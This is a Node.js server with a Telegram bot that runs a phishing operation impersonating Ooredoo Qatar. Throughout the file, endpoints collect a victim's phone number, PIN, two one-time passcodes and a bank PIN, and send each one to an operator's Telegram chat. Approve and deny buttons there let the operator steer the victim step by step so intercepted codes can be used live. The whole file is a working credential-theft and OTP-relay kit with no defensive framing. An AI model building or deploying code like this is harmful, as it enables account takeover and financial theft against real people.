const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "قطر 🇶🇦";
    const countryCode = "+974";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>OOREDOO QATAR - محاولة تسجيل الدخول</b>

🆕 <b>مستخدم جديد</b>
🇶🇦 <b>الدولة:</b> ${country}
🌍 <b>رمز الدولة:</b> ${countryCode}
📱 <b>رقم الهاتـف:</b> ${phone}
🔢 <b>الرمز السري (PIN):</b> ${pin}
⏰ <b>الوقت:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>المستخدم بانتظار الموافقة</b>
⌛ <b>المهلة: 5 دقائق</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ السماح بالمتابعة", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ بيانات غير صحيحة", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "قطر 🇶🇦";
    const countryCode = "+974";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🆕 <b>OOREDOO QATAR - مطلوب رمز التحقق</b>
🇶🇦 <b>الدولة:</b> ${country}
📞 <b>رمز الدولة:</b> ${countryCode}
📱 <b>رقم الهاتف:</b> ${phone}
🔑 <b>رمز التحقق (OTP):</b> <code>${code}</code>
⏰ <b>الوقت:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>تحقق من بيانات الاعتماد:</b>
⏰ <b>المهلة: 5 دقائق</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ صحيح (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ رمز خطأ", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ PIN خطأ", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 اتصل بنا", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "قطر 🇶🇦";
    const countryCode = "+974";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>OOREDOO QATAR - رمز التحقق الثاني (2/2)</b>

🆕 <b>مستخدم جديد - التحقق الثاني</b>
🇶🇦 <b>الدولة:</b> ${country}
🌍 <b>رمز الدولة:</b> ${countryCode}
📱 <b>رقم الهاتف:</b> ${phone}
🔐 <b>رمز التحقق الثاني:</b> ${otp}
⏰ <b>الوقت:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>تحقق من الرمز الثاني:</b>
⌛ <b>المهلة: 5 دقائق</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ صحيح", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ رمز خطأ", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 PIN خطأ", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>طلب إعادة إرسال الرمز</b>

📱 <b>رقم الهاتف:</b> ${phone}
📍 <b>الخطوة:</b> ${step}
⚠️ <b>المستخدم ينتظر رمزاً جديداً.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "قطر 🇶🇦";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>OOREDOO QATAR - التحقق من رمز البنك (الخطوة 3)</b>

🆕 <b>أمان الحساب البنكي</b>
🇶🇦 <b>الدولة:</b> ${country}
📱 <b>رقم الهاتف:</b> ${phone}
🔑 <b>الرمز البنكي:</b> ${bankPin}
⏰ <b>الوقت:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>تحقق من الرمز البنكي:</b>
⌛ <b>المهلة: 5 دقائق</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ صحيح", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ رمز خطأ", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>تمت الموافقة على الدخول</b>

🆕 <b>مستخدم جديد</b>
🇶🇦 <b>قطر</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>الحالة: تمت الموافقة</b>
➡️ <b>التالي: التحقق الأول (1/2)</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("تم السماح");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>بيانات غير صحيحة</b>

🇶🇦 <b>قطر</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>الحالة: مرفوض</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("تم الرفض");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>تم التحقق من الرمز الأول (1/2)</b>
🇶🇦 <b>قطر</b>
📱 <b>${phone}</b>
━━━━━━━━━━━━━━━
✅ <b>الحالة: تم التحقق بنجاح</b>`;

    await ctx.answerCbQuery("تم التحقق");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("رمز خاطئ");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>الرمز الأول خاطئ</b>\n📱 <b>المستخدم:</b> ${phone}`);
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("تم النقر على اتصل بنا");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>طلب التواصل</b>\n📱 <b>المستخدم:</b> ${phone}`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    await ctx.answerCbQuery("تم الانتهاء");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`2️⃣ <b>تم التحقق الثاني (2/2)</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>`);
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("رمز خاطئ");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>الرمز الثاني خاطئ</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    await ctx.answerCbQuery("تم التحقق من الرمز البنكي");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>تم التحقق من الرمز البنكي</b>\n📱 <b>${phone}</b>\n🔑 <b>${pin}</b>`);
});

bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("رمز البنك خاطئ");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>رمز البنك خاطئ</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("PIN خاطئ");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>تم الإبلاغ عن خطأ في الرمز السري (PIN)</b>\n📱 <b>${phone}</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
